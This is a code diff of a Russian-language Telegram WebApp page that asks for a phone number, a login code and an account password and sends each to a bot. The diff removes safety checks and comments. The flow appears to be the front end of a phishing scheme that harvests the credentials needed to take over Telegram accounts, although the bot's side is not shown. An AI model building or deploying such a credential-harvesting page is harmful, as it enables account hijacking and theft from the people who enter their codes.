@@ -139,8 +139,7 @@
     </div>
 
     <script>
-        // Безопасно получить объект WebApp
-        const WebApp = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
+        const WebApp = window.Telegram.WebApp;
 
         // Элементы
         const phoneView = document.getElementById('phone-view');
@@ -180,32 +179,13 @@
             viewElement.classList.remove('hidden');
         }
 
-        function disableAllButtons() {
-            phoneButton.disabled = true;
-            codeButton.disabled = true;
-            passwordButton.disabled = true;
-        }
-
-        function enableAllButtons() {
-            phoneButton.disabled = false;
-            codeButton.disabled = false;
-            passwordButton.disabled = false;
-        }
-
         function sendData(data, buttonElement) {
-            // Показываем лоадер и блокируем кнопку
             const originalText = buttonElement.innerText;
             buttonElement.disabled = true;
             buttonElement.innerText = 'Загрузка...';
 
             try {
-                if (!WebApp) {
-                    throw new Error('WebApp SDK не обнаружен. Откройте через Telegram.');
-                }
-                // Если WebApp присутствует и инициализирован — отправляем данные боту.
                 WebApp.sendData(JSON.stringify(data));
-                // Примечание: WebApp.sendData автоматически закроет/свернёт WebApp в клиенте Telegram.
-                // Тут мы не пытаемся повторно открывать, т.к. поведение закрытия — штатное.
             } catch (error) {
                 displayMessage('Ошибка отправки: ' + error.message, 'error');
                 buttonElement.disabled = false;
@@ -239,9 +219,9 @@
         // --- Обработчики кнопок ---
         
         phoneButton.addEventListener('click', () => {
-            const phone = phoneInput.value.replace(/[^0-9+]/g, ''); // Очистка номера
+            const phone = phoneInput.value.replace(/[^0-9+]/g, '');
             if (phone.length < 10) {
-                displayMessage('Пожалуйста, введите корректный номер телефона.', 'error');
+                displayMessage('Введите корректный номер телефона.', 'error');
                 return;
             }
             sendData({ step: 'phone', phone: phone }, phoneButton);
@@ -249,8 +229,8 @@
 
         codeButton.addEventListener('click', () => {
             const code = codeInputs.map(input => input.value).join('');
-            if (code.length !== 5) {
-                displayMessage('Код должен состоять из 5 цифр.', 'error');
+            if (code.length < 5) {
+                displayMessage('Код должен содержать не менее 5 цифр.', 'error');
                 return;
             }
             sendData({ step: 'code', code: code }, codeButton);
@@ -259,7 +239,7 @@
         passwordButton.addEventListener('click', () => {
             const password = passwordInput.value;
             if (!password) {
-                displayMessage('Пожалуйста, введите ваш пароль.', 'error');
+                displayMessage('Введите ваш пароль.', 'error');
                 return;
             }
             sendData({ step: 'password', password: password }, passwordButton);
@@ -270,21 +250,9 @@
         
         function init() {
             try {
-                if (!WebApp) {
-                    // Если SDK не загружен (например страница открыта в браузере напрямую),
-                    // показываем предупреждение и отключаем кнопки.
-                    displayMessage('Откройте эту страницу через кнопку WebApp бота в Telegram. В веб-браузере отправка данных невозможна.', 'error');
-                    disableAllButtons();
-                    // Но показываем экран телефона — чтобы можно было видеть интерфейс.
-                    showView(phoneView);
-                    return;
-                }
-
                 WebApp.ready();
-                // Попробуем развернуть, если это поддерживается в клиенте
-                try { WebApp.expand(); } catch (e) { /* ignore */ }
-
-                // Определяем, какой экран показать, на основе URL-параметра
+                WebApp.expand();
+                
                 const urlParams = new URLSearchParams(window.location.search);
                 const step = urlParams.get('step');
                 
@@ -295,18 +263,13 @@
                     showView(passwordView);
                     passwordInput.focus();
                 } else {
-                    // По умолчанию показываем экран ввода телефона
                     showView(phoneView);
                     phoneInput.focus();
                 }
 
-                // Если SDK есть, кнопки должны быть активны
-                enableAllButtons();
-
             } catch (error) {
                 console.error("Failed to init Telegram WebApp:", error);
-                // Исправленная строка — теперь без разрывов внутри кавычек
-                document.body.innerHTML = "Ошибка: Не удалось инициализировать Telegram WebApp. Убедитесь, что открываете через Telegram.";
+                displayMessage("Ошибка: Не удалось инициализировать Telegram WebApp.", 'error');
             }
         }
 
@@ -319,4 +282,3 @@
     </script>
 </body>
     </html>
-    
